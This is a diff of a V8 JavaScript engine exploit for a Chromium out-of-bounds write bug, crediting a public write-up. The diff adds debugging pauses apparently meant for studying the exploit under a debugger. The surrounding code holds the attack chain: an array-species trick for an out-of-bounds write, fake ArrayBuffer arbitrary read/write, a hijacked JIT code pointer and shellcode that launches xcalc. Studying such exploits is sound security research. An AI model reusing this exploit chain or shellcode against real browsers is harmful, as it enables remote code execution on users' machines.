@@ -1,6 +1,14 @@
 // Source: https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/
 //
 // v8 exploit for https://crbug.com/716044
+
+function debug_stub(msg){
+  console.log(msg);
+  readline();
+}
+
+
+debug_stub("before begin"); // Giving a chance to attach
 var oob_rw = null;
 var leak = null;
 var arb_rw = null;
@@ -9,6 +17,8 @@ var code = function() {
   return 1;
 }
 code();
+//%DebugPrint(code);
+debug_stub("print JSFunc Info");
 
 class BuggyArray extends Array {
   constructor(len) {
@@ -24,6 +34,8 @@ class MyArray extends Array {
     return BuggyArray;
   }
 }
+
+
 
 var convert_buf = new ArrayBuffer(8);
 var float64 = new Float64Array(convert_buf);
@@ -50,6 +62,7 @@ function Uint64Add(dbl, to_add_int) {
 // |arb_rw ArrayBuffer |
 // ================================================================================
 var myarray = new MyArray();
+
 myarray.length = 9;
 myarray[4] = 42;
 myarray[8] = 42;
@@ -72,6 +85,7 @@ uint32[1] = js_function_uint32[1];
 oob_rw[15] = Uint64Add(float64[0], 128); // 128 = code header size
 
 // pop /usr/bin/xcalc
+debug_stub("before execution");
 var shellcode = new Uint32Array(arb_rw);
 shellcode[0] = 0x90909090;
 shellcode[1] = 0x90909090;
@@ -94,4 +108,5 @@ shellcode[17] = 0x485250c0;
 shellcode[18] = 0xc748e289;
 shellcode[19] = 0x00003bc0;
 shellcode[20] = 0x050f00;
+debug_stub("before execution");
 code();
